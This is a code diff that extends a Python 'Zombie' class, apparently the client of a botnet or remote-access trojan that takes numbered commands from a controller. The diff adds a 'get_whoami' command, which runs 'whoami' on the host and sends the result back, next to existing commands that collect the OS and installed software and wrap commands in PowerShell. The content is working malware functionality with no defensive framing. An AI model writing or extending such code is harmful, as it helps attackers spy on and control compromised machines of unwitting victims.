@@ -12,8 +12,12 @@ codes_list = {
     '__comment__get_os':'cid=2, does not have second part (for request)',
     'get_os':'2',
     '2':'get_os',
+    '__comment__get_software':'cid=3, does not have second part (for request)',
     'get_software':'3',
-    '3':'get_software'
+    '3':'get_software',
+    '__comment__get_whoami':'cid=4, does not have second part (for request)',
+    '4':'get_whoami',
+    'get_whoami':'4'
 }
 
 class Zombie:
@@ -98,6 +102,9 @@ class Zombie:
         elif code == 'get_software':
             self.send_software()
 
+        elif code == 'get_whoami':
+            self.send_whoami()
+
     def powershellize_command(self, command):
         powershell_command = 'powershell "{}"'.format(command)
         return powershell_command
@@ -106,6 +113,12 @@ class Zombie:
         import platform
         os_name = platform.system()
         return os_name.lower()
+
+    def send_whoami(self):
+        command = 'whoami'
+        import os
+        output = os.popen(command).read()
+        self.msg_manager(msg='cid={},{}'.format(codes_list['get_whoami'], output))
 
     def send_software(self):
         os_name = self.get_os()
